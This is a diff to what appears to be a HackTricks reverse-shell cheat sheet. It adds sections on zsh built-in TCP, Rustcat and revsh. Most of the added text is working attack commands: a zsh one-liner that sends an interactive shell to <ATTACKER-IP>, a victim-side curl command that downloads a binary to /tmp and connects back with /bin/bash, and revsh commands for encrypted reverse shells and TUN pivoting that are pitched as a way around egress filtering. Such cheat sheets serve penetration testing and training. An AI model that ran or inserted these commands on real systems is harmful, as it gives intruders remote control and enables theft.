@@ -257,6 +257,54 @@ or
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 
+## Zsh (built-in TCP)
+
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – modern netcat-like listener written in Rust (packaged in Kali since 2024).
+
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+  && chmod +x /tmp/rcat \
+  && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+
+Features:
+- Optional `--ssl` flag for encrypted transport (TLS 1.3)
+- `-s` to spawn any binary (e.g. `/bin/sh`, `python3`) on the victim
+- `--up` to automatically upgrade to a fully interactive PTY
+
+## revsh (encrypted & pivot-ready)
+
+`revsh` is a tiny C client/server that provides a full TTY over an **encrypted Diffie-Hellman tunnel** and can optionally attach a **TUN/TAP** interface for reverse VPN-like pivoting.
+
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+
+Useful flags:
+- `-b` : bind-shell instead of reverse
+- `-p socks5://127.0.0.1:9050` : proxy through TOR/HTTP/SOCKS
+- `-t` : create a TUN interface (reverse VPN)
+
+Because the entire session is encrypted and multiplexed, it often bypasses simple egress filtering that would kill a plain-text `/dev/tcp` shell.
+
 ## OpenSSL
 
 The Attacker (Kali)
@@ -378,8 +426,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
